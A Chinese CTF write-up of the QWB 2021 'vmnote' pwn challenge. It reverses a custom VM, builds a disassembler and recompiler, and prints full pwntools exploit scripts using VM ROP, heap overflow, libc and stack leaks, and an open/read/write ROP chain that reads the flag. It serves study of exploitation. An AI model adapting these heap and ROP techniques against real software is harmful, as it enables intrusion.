---
title: qwb2021_vmnote
date: 2021-07-28 19:45:59
permalink: /pages/55fac3/
categories:
  - ctf_wp
  - qwb
tags:
  - 
---
#  qwb2021 vmnote

[[toc]]

其实去年暑假左右开始出现vm pwn题目, 简单逆向然后写opocode的, 去年国赛的时候出题就想做个vm内的rop的题目的思路, 但是后面划水挺久, 一直也就是个想法而已,这次在别人手里看到这么一个题目, 确实有趣. 膜出题师傅和赛时直接[重编译逆完了](https://github.com/P4nda0s/qwb_vmnote_recompiler)的队友,

## 逆向

### vmnote逆向

main函数进去比较简单, 也就不多赘述了, 直接进入下层函数,

![image-20210728195214178](https://i.loli.net/2021/07/28/YX4grQSzfyaWl9w.png)

`init_mem`中基本都是赋值为0的初始化, 其实也看不出啥, 

`vm_init`函数是读取文件并载入到内存中, 其中还设置了沙盒, 只允许open read write, 而且题目libc是2.31, setcontext不能使用, 得一点点写rop, 

然后在`vm_run`函数中就是运行虚拟机, 修一下跳转表, 

从opcode数组内取出opcode 以后取低五位指示对应的handler, 在某些指令中高三位用来判断数据大小, 然后程序内有以下数据

其中reg表示的是对应的寄存器, 在程序中经常出现类似数据的按照索引在这个数组取值, 其实是对应寄存器, 其中pc sp等单独列出来, 但是同样可以用reg[idx]索引到, 

eflag是程序中存在判断修改eflag寄存器和后续通过eflag寄存器判断条件跳转, 

程序内有栈, 但是只是用来储存数据等, 

实现了函数调用, 基于栈运算, 还有模拟x86的栈帧,

![image-20210729100247922](https://i.loli.net/2021/07/29/U6OXpug7canhqoB.png)

简单说下vm的处理, 因为正好是模拟x86的指令, 于是写一个可以将其翻译为x86指令集, 然后重编译.

### 反汇编脚本

肯定是基于python写, 然后开头模仿vmnote程序本身, 按照note.bin文件的格式读取文件, 

```python 
class vmnote:
    def __init__(self, filename):
        self.regs = ["rdi", "rsi", "rdx", "rcx",  "r8", "r9", "r10", "r11", "r12","r13", "r14", "rbp", "rsp"]
        self.set_opcode(filename)
        self.handlers_init()
        self.stack = []
        self.eflag = 0
        self.asmcode = ""

    def set_opcode(self, filename):
        f = open(filename, "rb")
        self.opcode_size = u32(f.read(4))
        data_size = u32(f.read(4))
        self.pc = u32(f.read(4))
        self.pdata = u32(f.read(4))
        self.opcode = f.read(self.opcode_size)
        self.data = f.read(data_size)

```

然后switch语句我选择用字典实现:

> 当然, 最开始是写了个代码生成出来的字符串, 后面一点点确定各个handler是干啥的, 当然也可以看到, 有的handler没有用到, 也就没去分析.

```python

    def disasm(self):
        self.is_run = 1
        while ((self.pc < self.opcode_size) and (self.is_run)):
            var = self.fetch()
            op = var & 0x1f
            flag = (var >> 5) & 7

            self.asmcode += "_{:04x}:\t".format(self.pc - 1)
            if (op > 0x1d):
                print("no! op > 0x1d")
            else:
                self.handlers[op](flag)

    def handlers_init(self):
        self.handlers = {
            0x00: self.push,
            0x01: self.mov_ptr,
            0x02: self.handler02,
            0x03: self.input,
            0x04: self.leave,
            0x05: self.sub,
            0x06: self.handler06,
            0x07: self.add,
            0x08: self.handler08,
            0x09: self.mov_store,
            0x0a: self.handler0a,
            0x0b: self.cmp,
            0x0c: self.exit,
            0x0d: self.andd,
            0x0e: self.handler0e,
            0x0f: self.handler0f,
            0x10: self.handler10,
            0x11: self.call,
            0x12: self.inc,
            0x13: self.jmp,
            0x14: self.pop,
            0x15: self.handler15,
            0x16: self.mov1,
            0x17: self.print,
            0x18: self.ret,
            0x19: self.syscall,
            0x1a: self.handler1a,
            0x1b: self.test,
            0x1c: self.mul,
            0x1d: self.xor,
        }
```

简单说下分析的过程: 

最开始看到的是handler00, 也正好是第一个, 简单可以分析出来是push, 

```python 
    def get_reg(self):
        return self.regs[self.fetch()]

	# push
    def push(self, flag):
        self.asmcode += " push {}\n".format(self.get_reg())

```

然后是mov, 比较特殊的是前面提到了的, 高三位会作为falg位, 标识取出数据的大小, 这里在`self.fetch`上也增加了这个标识位, 并默认为byte类型,

```python
    # mov reg, {number/reg}
    def mov1(self, flag):
        if flag:
            reg = self.get_reg()
            number = self.fetch(flag)
            self.asmcode += "mov {}, 0x{:08x}\n".format(reg, number)
        else:
            reg1 = self.get_reg()
            reg2 = self.get_reg()
            self.asmcode += "mov {}, {}\n".format(reg1, reg2)


    def fetch(self, flag=1):
        if flag == 1:
            self.pc += 1
            var = self.opcode[self.pc - 1]
        if flag == 2:
            self.pc += 2
            var = u16(self.opcode[self.pc - 2:self.pc])
        if flag == 3:
            self.pc += 4
            var = u32(self.opcode[self.pc - 4:self.pc])
        if flag == 4:
            self.pc += 8
            var = u64(self.opcode[self.pc - 8:self.pc])
        return var
```

然后后续分析会遇到函数调用, 分为直接调用地址, 还是根据寄存器去调用两种情况.

![image-20210728202650801](https://i.loli.net/2021/07/28/mkDj4fJ5XULhsp8.png)

往下是test指令, 两个寄存器&运算,只修改eflag寄存器值, 

![image-20210728202904259](https://i.loli.net/2021/07/28/9m4scXeKEv3auWB.png)

然后是jmp系列指令,  根据flag标识不同跳转,

```python
    def jmp(self, flag):
        target = self.fetch(3)
        if flag == 0:
            self.asmcode += "jmp _{:04x}\n".format(target)
        if flag == 1:
            self.asmcode += "jz _{:04x}\n".format(target)
        if flag == 2:
            self.asmcode += "jnz _{:04x}\n".format(target)
        if flag == 3:
            self.asmcode += "jl _{:04x}\n".format(target)
        if flag == 4:
            self.asmcode += "jg _{:04x}\n".format(target)
```

然后后续指令差不太多, 运算指令基本都是基于寄存器的, 然后flag位置标识运算数据大小,

```python
    # xor reg, {reg/number}
    def xor(self, flag):
        if flag:
            reg1 = self.get_reg()
            number = self.fetch(flag)
            self.asmcode += "xor {}, 0x{:08x}\n".format(reg1, number)
        else:
            reg1 = self.get_reg()
            reg2 = self.get_reg()
            self.asmcode += "xor {}, {}\n".format(reg1, reg2)

```

其他的差不多, 基本都可以写出来, 完整脚本在github和文末, 

程序中比较有意思的还有个opcode 0x19, 其中通过寄存器0判断运行什么指令, 是实现了一个系统调用的操作, 直接写为`syscall`即可,

### vm重编译

我们可以将整个opcode翻译为大致的x86指令后, 开始优化代码并重编译, 

先简单说下重编译, 我们的到的汇编代码在`self.asmcode`, 可以直接用pwntool里的asm编译出来字节码,然后写入到文件中. 

```python
    def recompile(self, filename):
        buf = self.asmcode
        code = asm(buf, arch='amd64')
        open(filename, "wb").write(code)
```

以下是关于优化的问题, 

这里有几个指令其实不好处理, `print`, `input`, `exit` 

这里我的做法是这样的, 在汇编代码最后将这几个单独写为一个函数, 然后对应handler就直接写为`call _xxx`, 

> 这个做法其实有个问题, 主要是ida太智能吧, 如果你这个函数是个死循环之类的, 后面的在反编译会认为是两段, 一开始我吧这几个函数写为死循环就遭遇了这个问题, 后面换成了`mov rax,xx; ret`就ok了, 

然后另一个问题是vmnote内的寄存器规则和x86使用寄存器规则不一样,

主要是函数调用参数是r1, r2, 返回值是r1, 于是这里我设置r1=rdi, r2=rsi, 在ret之前加一句`mov rax, rdi`保证ida可以识别到返回值, call运行以后跟一句`mov rdi, rax`保证后面的程序正常运行,

于是基本可以重编译出来一个新文件, 放到ida中, 编译器设置为gun c++即可, 

### note.bin逆向

我直接写入文件了, 因此从地址00开始运行, start函数如下:

![image-20210728205551187](https://i.loli.net/2021/07/28/ILYl8JsFygmDkzq.png)

init函数主要是解密字符串, 通过系统调用实现了time和设置随机数种子, 

![image-20210728205800309](https://i.loli.net/2021/07/28/VxuygQsFkwniGaT.png)

这里的解密其实就是异或, 我们也可以简单的完成:

```python
    def string_decode(self, index, var):
        arr = []
        xor = 0
        i = 0;
        while True:
            xor = (self.data[index + i]-i) ^ var
            if xor==0:
                break;
            arr.append(xor)
            i += 1
        return bytes(arr), hex(index)
```

![image-20210728205934324](https://i.loli.net/2021/07/28/FtEcoDMbJ6NVC9w.png)

 在`set1_check`函数中就是提示输入, 然后进入check函数

![image-20210728210003015](https://i.loli.net/2021/07/28/DAETfKGaOYkHrWZ.png)

其中先校验长度大于17, 前17字节进入funccheck, 后面的部分和打印给出的随机数相差`0x12345678`, 

![image-20210728210217119](https://i.loli.net/2021/07/28/fy67IoXgNbW1BPm.png)

![image-20210728210243914](https://i.loli.net/2021/07/28/ApvlsFmMPz2VQYh.png)

这一段的解密:

```python
    check = vm.data[0x120:0x120+17]
    data = vm.data[0x1f:]
    arr = []
    for i in range(17):
        arr.append(data.find(check[i]))
    print(bytes(arr))
    
    # b'01d_6u7_v190r0u5_'
```

### 堆部分

接下来进入note.bin的堆部分, 实现了个菜单, 有add, dele, show三种功能, 在data中通过数组储存, 三种功能的实现都是通过系统调用在vmnote内实现的,

对应的位置在这里opcode 0x19号, syscall位置,

![image-20210729091419764](https://i.loli.net/2021/07/29/EozegYFxIP2nTUv.png)

其中在note.bin中使用数组维护chunk_list, 在vmnote中, 也使用一个单项链表维护堆块列表, 可以在`add_heap`中看到详细代码,

![image-20210729091531382](https://i.loli.net/2021/07/29/mFcyrAkSpvo9TWH.png)

其中记录size的位置在edit功能会检查堆块大小,

## 利用

首先在程序中找到相关漏洞.

### 漏洞

第一个是syscall 6,实现了edit功能, 在对应的`check_size`函数传入的参数的Dword类型,但是后续使用的read位置是QWORD类型, 这里可以通过伪造数据绕过`check_size`, 实现一个堆溢出向后覆写

![image-20210729092954390](https://i.loli.net/2021/07/29/8BcMm7xZe2W4aiD.png) 

第二个漏洞在note.bin中, 在堆上的一个off by null.

![image-20210729093102425](https://i.loli.net/2021/07/29/8ILSetupkQnw3E6.png)

![image-20210729093127037](https://i.loli.net/2021/07/29/BH2ptV317AGfWUQ.png)

### vm rop

首先能控制操作流程的是这个位置的栈上的off by null, 可以修改掉ebp的最低位, 概率性跳转到前面的输入中, 这里构造一个vm中的rop, 借助我们前面脚本生成的反汇编代码可以轻松完成.

可以利用的是以下位置, 可以控制两个参数, 并调用这个read函数, 

```
_0x6ca: pop rdi
_0x6cc: pop rsi
_0x6ce: mov rax, rdi
		ret
```

> 调试略显麻烦, 断点下在leave和ret的handler位置吧,

然后返回地址, 先返回read_number函数, 这里有一次leave+ret, 因为我们修改的是ebp因此还需要一次leave+ret, 那么使用show功能内的`read_number`函数触发, 返回时就又有一层show函数的leave+ret, 

此时如果成功, 则会在这里, 概率性的返回到我们输入的数据上,

![image-20210729102030657](https://i.loli.net/2021/07/29/ju9GRDlwpFBPJMe.png)

这里的rop思路大概就是设置俩寄存器以后跳到read就好, size可以设置为0x1000一个大的数据就好, 另一个数据是一个在stack中的索引值, 这个不好找, 

因为概率性跳转到不定位置, 因此我们在前面输入大量ret作为滑板, 同时, 在leave语句中这个滑板会赋值给ebp, 

其实我们使用漏洞修改了ebp低位为00, 然后在show中激活漏洞确保两次leave栈迁移向上了几位, 此时ebp值又被修改, 我们可以leave再赋值给esp, 栈迁移到这个位置, 同时这个地址我们知道, 也就可以构造rop向其中写入数据, 然后leave,

经过调试, 我们可以在内存中找到我们的数据, 

![image-20210729105714242](https://i.loli.net/2021/07/29/KqnJX9soGPFvLUy.png)

同时, 这个思路可行,

![image-20210729110106361](https://i.loli.net/2021/07/29/HYSwaZGftNpKJs4.png)

然后栈迁移到了0x65b位置,

> 需要注意的是leave的运行, 首先设置rsp, 然后pop出rbp, 
>
> 因此leave的是后, rsp=rbp=0x653, 然后pop, rbp=[0x653]=0, rsp=0x653+8
>
> 后续我们再次leave, rsp=0, 此后我们向0+8地址写入rop, 并最后写入leave, 这样运行完一段rop后rsp会重回0地址, 然后再次运行下一段,

但是这里是概率性爆破, 在此处设置为exp1, 并打印出一个字符串作为成功标识, 

```python
def exp1():
    change()
    payload = flat(ret, ret, ret, ret, ret, ret, ret, pop, 0x65b, 0x1000, read, leave)
    sla("choice>> ", "2")
    sa("idx:", payload)
    payload = flat(pop, strchange, 0, printf, pop , 8, 0x1000,  read, leave)
    sl(payload)
    ru("challenge")

while 1:
    cn = process("./rbin")
    try:
        exp1()
        break
    except:
        try:
            cn.close()
        except:
            print("none")

```

然后根据这个机制写了个这个函数, arr就是rop链, 然后number指定下一次的地址,其实可以0/0x500 反复跳, 因为担心正在运行的rop被修改,因此每次不能都写0, 

```python
def rop(arr, number):
    return flat(number, arr, pop, number, 0x1000, read, leave)
```

可以多次rop: 

![image-20210729112016019](https://i.loli.net/2021/07/29/chRsfUzN3XvMPEJ.png)

### 堆部分

堆的漏洞主要是在edit的时候伪造size实现堆溢出, 

但是在vm内并没办法使用完整功能, 限制也比较多, 我们可以rop以后, 可以使用rop重写一下几个syscall, 得到完整的功能

然后思路大体就是, 借助堆溢出, 修改vmnote中单向链表中的node, 基本可以实现一个任意地址读写, 通过unsortedbin的大堆块泄漏libc, 然后打印environ地址,得到栈地址, 通过libc中的syscall ret完成orw的rop, 

```python
def exp2():
    payload  = rop([pop, chunk_list, 0, printf], 0)
    sl(payload)
    recv()
    heap = u64(re(6, 2).ljust(8, b'\x00'))
    heap = heap - 0x480
    print(hex(heap))
    
    heap1 = heap + 0x480 
    heap2 = heap + 0x4d0

    
    def my_new(size):
        sl(rop([pop, size, 0, syscall3], 0))

    def my_dele(ptr):
        sl(rop([pop, ptr, 0, syscall4], 0))

    def my_show(ptr):
        sl(rop([pop, ptr, 0, syscall7], 0))
    
    def my_edit(ptr, size):
        sl(rop([pop, ptr, size, syscall6], 0))

    my_new(0x500)
    heap3 = heap + 0x520
    my_dele(heap3)

    my_edit(heap1, 0x100000004)
    payload = flat('a' * 0x20, 0, 0x21, heap3, 0x1000)
    sl(payload)

    my_show(heap3)
    ru("ontent: ")
    main_aeran = u64(re(6, 2).ljust(8, b'\x00'))
    print(hex(main_aeran))
    LIBC = main_aeran - 0x1ebbe0
    print("libc: " + hex(LIBC))
    libc = ELF("./libc.so.6")
    env = libc.sym['environ'] + LIBC 


    my_edit(heap2, 0x100000004)
    payload = flat('a' * 0x20, 0, 0x21, env, 0x1000)
    sl(payload)
    my_show(env)
    ru("ontent: ")
    stack = u64(re(6, 2).ljust(8, b'\x00'))
    print(hex(stack))

    stack = stack - 0x140 

    my_new(0x30)
    heap4 = heap3

    my_edit(heap4, 0x100000004)
    sl(flat('./flag\x00'.ljust(0x500, 'v'), 0, 0x21, stack, 0x1000))

    poprax = 0x4a550 + LIBC
    poprdi = 0x26b72 + LIBC
    poprsi = 0x27529 + LIBC
    poprdx = 0x11c371 + LIBC
    syscall = 0x66229 + LIBC

    my_edit(stack, 0x100000004)
    sl(flat(
        # open("./flag")
        poprax, 2, 
        poprdi, heap4, 
        poprsi, 0, 
        poprdx, 0, 0, 
        syscall, 
        # read(3, buf, 0x100)
        poprax, 0, 
        poprdi, 3, 
        poprsi, heap4, 
        poprdx, 0x100, 0, 
        syscall, 
        # write(1, buf, 0x100)
        poprax, 1, 
        poprdi, 1, 
        poprsi, heap4, 
        poprdx, 0x100, 0, 
        syscall
        ))


```



完整exp

::: details

或[github](https://github.com/wlingze/ctf_events/blob/main/other/qwb_2021_vmnote/exp.py)

```python 
#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2020 wlz <wlz@kyria>
#
# Distributed under terms of the MIT license.

from pwn import * 

pie  = 1
arch = 64
bps  = [0x000000000000228D]

def change():
    ru("challenge ")
    random = int(re(9, 2)) + 0x12345678
    payload = "01d_6u7_v190r0u5_"+str(random)
    sla('passcode: ', payload)
    
def add(idx, size, con):
    sla("choice>> ", "1")
    sla("idx:", str(idx))
    sla("size", str(size))
    sla("content:", con)

def show(idx):
    sla("choice>> ", "2")
    sla("idx:", str(idx))

def dele(idx):
    sla("choice>> ", "4")
    sla("idx:", str(idx))

ret = 0x653
pop = 0x6ca
read = 0x5ef
leave = 0x737
printf = 0x6a8
strchange = 0x1000
chunk_list = 0x1520

time = 0
def rop(arr, number):
    return flat(number, arr, pop, number, 0x1000, read, leave)


def exp1():
    change()
    add(0, 0x20, 'a')
    add(1, 0x20, 'b')

    payload = flat(ret, ret, ret, ret, ret, ret, ret, pop, 0x653, 0x1000, read, leave)
    sla("choice>> ", "2")
    sa("idx:", payload)
    payload  = rop([pop, strchange, 0, printf], 0x500)
    sl(payload)
    ru("challenge")

syscall3 = 0x77
syscall4 = 0x86
syscall6 = 0xa4
syscall7 = 0xb6

def exp2():
    payload  = rop([pop, chunk_list, 0, printf], 0)
    sl(payload)
    recv()
    heap = u64(re(6, 2).ljust(8, b'\x00'))
    heap = heap - 0x480
    print(hex(heap))
    
    heap1 = heap + 0x480 
    heap2 = heap + 0x4d0

    
    def my_new(size):
        sl(rop([pop, size, 0, syscall3], 0))

    def my_dele(ptr):
        sl(rop([pop, ptr, 0, syscall4], 0))

    def my_show(ptr):
        sl(rop([pop, ptr, 0, syscall7], 0))
    
    def my_edit(ptr, size):
        sl(rop([pop, ptr, size, syscall6], 0))

    my_new(0x500)
    heap3 = heap + 0x520
    my_dele(heap3)

    my_edit(heap1, 0x100000004)
    payload = flat('a' * 0x20, 0, 0x21, heap3, 0x1000)
    sl(payload)

    my_show(heap3)
    ru("ontent: ")
    main_aeran = u64(re(6, 2).ljust(8, b'\x00'))
    print(hex(main_aeran))
    LIBC = main_aeran - 0x1ebbe0
    print("libc: " + hex(LIBC))
    libc = ELF("./libc.so.6")
    env = libc.sym['environ'] + LIBC 


    my_edit(heap2, 0x100000004)
    payload = flat('a' * 0x20, 0, 0x21, env, 0x1000)
    sl(payload)
    my_show(env)
    ru("ontent: ")
    stack = u64(re(6, 2).ljust(8, b'\x00'))
    print(hex(stack))

    stack = stack - 0x140 

    my_new(0x30)
    heap4 = heap3

    my_edit(heap4, 0x100000004)
    sl(flat('./flag\x00'.ljust(0x500, 'v'), 0, 0x21, stack, 0x1000))

    poprax = 0x4a550 + LIBC
    poprdi = 0x26b72 + LIBC
    poprsi = 0x27529 + LIBC
    poprdx = 0x11c371 + LIBC
    syscall = 0x66229 + LIBC

    my_edit(stack, 0x100000004)
    sl(flat(
        # open("./flag")
        poprax, 2, 
        poprdi, heap4, 
        poprsi, 0, 
        poprdx, 0, 0, 
        syscall, 
        # read(3, buf, 0x100)
        poprax, 0, 
        poprdi, 3, 
        poprsi, heap4, 
        poprdx, 0x100, 0, 
        syscall, 
        # write(1, buf, 0x100)
        poprax, 1, 
        poprdi, 1, 
        poprsi, heap4, 
        poprdx, 0x100, 0, 
        syscall
        ))



context.os='linux'

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

slog = {'name' : 111}
local = int(sys.argv[1])

if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'

if local:
    cn = process('./rbin')
    # cn = process(['./ld', './bin'], env={"LD_PRELOAD":"./libc"})
else:
    cn = remote( )

elf = ELF('./bin')


re  = lambda m, t : cn.recv(numb=m, timeout=t)
recv= lambda      : cn.recv()
ru  = lambda x    : cn.recvuntil(x)
rl  = lambda      : cn.recvline()
sd  = lambda x    : cn.send(x)
sl  = lambda x    : cn.sendline(x)
ia  = lambda      : cn.interactive()
sla = lambda a, b : cn.sendlineafter(a, b)
sa  = lambda a, b : cn.sendafter(a, b)
sll = lambda x    : cn.sendlineafter(':', x)
# after a, send b;

while 1:
    cn = process("./bin")
    try:
        exp1()
        break
    except:
        sleep(0.2)
        try:
            cn.close()
        except:
            print("none")
exp2()

slog_show()

ia()


```

:::

